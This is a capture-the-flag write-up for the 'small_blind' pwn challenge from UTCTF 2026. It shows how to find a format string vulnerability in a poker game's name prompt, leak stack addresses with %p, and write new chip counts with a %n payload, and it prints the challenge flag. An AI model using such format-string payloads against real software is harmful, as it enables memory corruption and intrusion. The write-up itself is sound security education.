# Writeup: UTCTF 2026 - small_blind (pwn)



## Challenge Description
"Come play some poker! You've got 500 chips and a shot to double up. The flag's behind a win condition, but a good poker player knows there's always more than one way to win."

Connecting via `nc challenge.utctf.live 7255`.

## Initial Reconnaissance
Upon connecting, the game asks for a name. After providing a name, it welcomes you to a Texas Hold'em table with 500 chips. The goal is to "double up" to get the flag.

### Vulnerability Hunting
I first tested for common vulnerabilities in the name field.
```bash
Enter your name: %p %p %p
Welcome to the table, 0x7ffd62384e00 (nil) (nil)!
```
The application leaked stack addresses! This confirmed a **Format String Vulnerability** in the registration menu.

## Exploitation Strategy

### 1. Identifying the Targets
I needed to find where the chip counts were stored. I wrote a script to leak many stack values and observed index `29` contained `0x1f4000001f4` (500 in hex for both player and dealer).
-   `index 6` on the stack points to the dealer's chips.
-   `index 7` on the stack points to the player's chips.

### 2. Crafting the Payload
Since indices 6 and 7 already contained pointers to the memory addresses of the chip counts, I could use the `%n` format specifier to write to these addresses directly.

The goal was to set my chips to a value greater than 1000 to trigger the "double up" condition.

**Payload:** `'%1001c%6$n%1c%7$n'`
-   `%1001c`: Prints 1001 space characters.
-   `%6$n`: Writes the number of characters printed so far (1001) to the address pointed to by stack index 6 (Dealer's chips).
-   `%1c`: Prints 1 more character. Total printed = 1002.
-   `%7$n`: Writes the new total (1002) to the address pointed to by stack index 7 (Player's chips).

### 3. Triggering the Flag
After sending the payload, I chose not to play a hand (`n`). This triggered the final chip count check.

```bash
Enter your name: %1001c%6$n%1c%7$n
...
Your chips: 1002  |  Dealer chips: 1001
Play a hand? (y to play / n to exit / t to toggle Unicode suits [currently on]): n
Thanks for playing, ...! Final chips: 1002

Incredible! You've minted new chips and won the prize: utflag{counting_chars_not_cards}
```

## Conclusion
The challenge was a classic "blind" pwn (though I could see the output) solvable via a format string vulnerability. Instead of playing poker, I used the registration menu to "cheat" and rewrite the game's memory to give myself enough chips to win.

**Flag:** `utflag{counting_chars_not_cards}`
